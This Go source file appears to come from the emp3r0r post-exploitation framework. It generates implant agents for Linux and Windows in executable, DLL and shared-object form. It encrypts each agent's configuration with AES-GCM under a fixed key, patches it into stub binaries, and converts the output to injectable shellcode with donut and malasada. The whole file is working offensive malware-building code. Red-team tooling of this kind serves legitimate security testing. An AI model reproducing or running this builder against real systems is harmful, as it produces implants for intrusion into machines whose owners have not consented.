package builder

import (
	"bytes"
	"fmt"
	"os"
	"slices"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/donut"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

const (
	PayloadTypeLinuxExecutable   = "linux_executable"
	PayloadTypeWindowsExecutable = "windows_executable"
	PayloadTypeWindowsDLL        = "windows_dll"
	PayloadTypeLinuxSO           = "linux_so"
)

var PayloadTypeList = []string{
	PayloadTypeLinuxExecutable,
	PayloadTypeLinuxSO,
	PayloadTypeWindowsExecutable,
	PayloadTypeWindowsDLL,
}

var ArchListWindows = []string{
	"386",
	"amd64",
	"arm64",
}

var ArchListWindowsDLL = []string{
	"386",
	"amd64",
	"arm64",
}

var ArchListLinuxSO = []string{
	"amd64",
	"386",
	"arm",
	"riscv64",
}

var ArchListAll = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

// IsArchValid validates if target arch choice is compatible with payload type
func IsArchValid(payloadType, archChoice string) bool {
	var list []string
	switch payloadType {
	case PayloadTypeWindowsExecutable:
		list = ArchListWindows
	case PayloadTypeWindowsDLL:
		list = ArchListWindowsDLL
	case PayloadTypeLinuxSO:
		list = ArchListLinuxSO
	default:
		list = ArchListAll
	}
	return slices.Contains(list, archChoice)
}

// AgentBuildConfig contains parameters for agent generation
type AgentBuildConfig struct {
	PayloadType  string
	Arch         string
	Timestamp    time.Time
	WorkSpace    string
	AgentUUID    string // Provided by operator (generated locally)
	AgentUUIDSig string // Provided by operator (signed by server)
}

// GenerateFilePaths determines stub and output file paths
func GenerateFilePaths(cfg AgentBuildConfig) (stubFile, outFile string) {
	t := cfg.Timestamp
	switch cfg.PayloadType {
	case "linux_executable":
		stubFile = fmt.Sprintf("stub-%s", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	case "windows_executable":
		stubFile = fmt.Sprintf("stub-win-%s", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	case "windows_dll":
		stubFile = fmt.Sprintf("stub-win-%s.dll", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	case "linux_so":
		stubFile = fmt.Sprintf("stub-%s.so", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	}

	// Set full path for stub
	stubFile = fmt.Sprintf("%s/%s", cfg.WorkSpace, stubFile)
	return stubFile, outFile
}

// EncryptAgentConfig generates UUID, signs it, marshals config to CBOR, and encrypts
func EncryptAgentConfig(cfg AgentBuildConfig) ([]byte, string, error) {
	configStruct := *live.RuntimeConfig

	// use provided UUID and signature
	configStruct.AgentUUID = cfg.AgentUUID
	configStruct.AgentUUIDSig = cfg.AgentUUIDSig

	// Marshal to CBOR
	cborBytes, err := cbor.Marshal(configStruct)
	if err != nil {
		return nil, "", fmt.Errorf("marshal config to CBOR: %w", err)
	}

	// Encrypt
	encryptedBytes, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
	if err != nil {
		return nil, "", fmt.Errorf("encrypt config: %w", err)
	}

	return encryptedBytes, configStruct.AgentUUID, nil
}

// PatchAgentBinary reads stub, patches with config, writes output
func PatchAgentBinary(stubFile, outFile string, configPayload []byte) error {
	// Read stub
	toWrite, err := os.ReadFile(stubFile)
	if err != nil {
		return fmt.Errorf("read stub: %w", err)
	}

	// Pad config payload to 4096 bytes
	if len(configPayload) < len(def.AgentConfig) {
		configPayload = append(configPayload, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(configPayload))...)
	} else if len(configPayload) > len(def.AgentConfig) {
		return fmt.Errorf("config payload too large: %d bytes (max %d)", len(configPayload), len(def.AgentConfig))
	}

	// Replace placeholder with config
	toWrite = bytes.Replace(toWrite,
		bytes.Repeat([]byte{0xff}, len(configPayload)),
		configPayload,
		1)

	// Write output
	if err := os.WriteFile(outFile, toWrite, 0o755); err != nil {
		return fmt.Errorf("write agent binary: %w", err)
	}

	return nil
}

// BuildAgentResult contains the results of agent building
type BuildAgentResult struct {
	StubFile   string
	OutputFile string
	AgentUUID  string
	ConfigSize int
}

// BuildAgent performs the complete agent generation workflow
// This is the main entry point for agent generation business logic
func BuildAgent(cfg AgentBuildConfig, runtimeConfig *def.Config) (*BuildAgentResult, error) {
	// 1. Generate file paths
	stubFile, outFile := GenerateFilePaths(cfg)

	// 2. Check stub exists
	if !util.IsExist(stubFile) {
		return nil, fmt.Errorf("stub file not found: %s", stubFile)
	}

	// 3. Encrypt agent config
	configPayload, agentUUID, err := EncryptAgentConfig(cfg)
	if err != nil {
		return nil, fmt.Errorf("encrypt config: %w", err)
	}

	// 4. Patch binary
	if err := PatchAgentBinary(stubFile, outFile, configPayload); err != nil {
		return nil, fmt.Errorf("patch binary: %w", err)
	}

	return &BuildAgentResult{
		StubFile:   stubFile,
		OutputFile: outFile,
		AgentUUID:  agentUUID,
		ConfigSize: len(configPayload),
	}, nil
}

// GenerateAgentWorkflowResult contains complete build and post-processing results
type GenerateAgentWorkflowResult struct {
	BuildResult   *BuildAgentResult
	ShellcodeFile string
	ShellcodeErr  error
}

// GenerateAgentWorkflow extracts the core agent generation business logic (configuration, UUID signing, binary patching, and shellcode conversion)
func GenerateAgentWorkflow(opts AgentConfig, payloadType, archChoice string, signAgentFn func(uuid string) (string, error)) (*GenerateAgentWorkflowResult, error) {
	if !IsArchValid(payloadType, archChoice) {
		return nil, fmt.Errorf("invalid arch choice '%s' for payload type '%s'", archChoice, payloadType)
	}

	// 1. Pass config to controller
	if err := MakeConfig(opts); err != nil {
		return nil, fmt.Errorf("configure agent: %w", err)
	}

	// 2. Generate UUID and Sign
	agentUUID := uuid.NewString()
	var sig string
	var err error
	if signAgentFn != nil {
		sig, err = signAgentFn(agentUUID)
		if err != nil {
			return nil, fmt.Errorf("sign agent UUID: %w", err)
		}
	}

	// 3. Build Agent
	buildCfg := AgentBuildConfig{
		PayloadType:  payloadType,
		Arch:         archChoice,
		Timestamp:    time.Now(),
		WorkSpace:    live.EmpWorkSpace,
		AgentUUID:    agentUUID,
		AgentUUIDSig: sig,
	}

	result, err := BuildAgent(buildCfg, live.RuntimeConfig)
	if err != nil {
		return nil, fmt.Errorf("build agent: %w", err)
	}

	workflowResult := &GenerateAgentWorkflowResult{
		BuildResult: result,
	}

	// 4. Generate shellcode for Windows
	if payloadType == PayloadTypeWindowsExecutable || payloadType == PayloadTypeWindowsDLL {
		err = donut.DonoutPE2Shellcode(result.OutputFile, archChoice, "main")
		if err != nil {
			workflowResult.ShellcodeErr = fmt.Errorf("donut failed: %w", err)
		} else {
			workflowResult.ShellcodeFile = result.OutputFile + ".bin"
		}
	}

	// 5. Generate shellcode for Linux SO
	if payloadType == PayloadTypeLinuxSO {
		err = tools.MalasadaConvert2Shellcode(result.OutputFile, "main", true)
		if err != nil {
			workflowResult.ShellcodeErr = fmt.Errorf("malasada failed: %w", err)
		} else {
			workflowResult.ShellcodeFile = result.OutputFile + ".bin"
		}
	}

	return workflowResult, nil
}
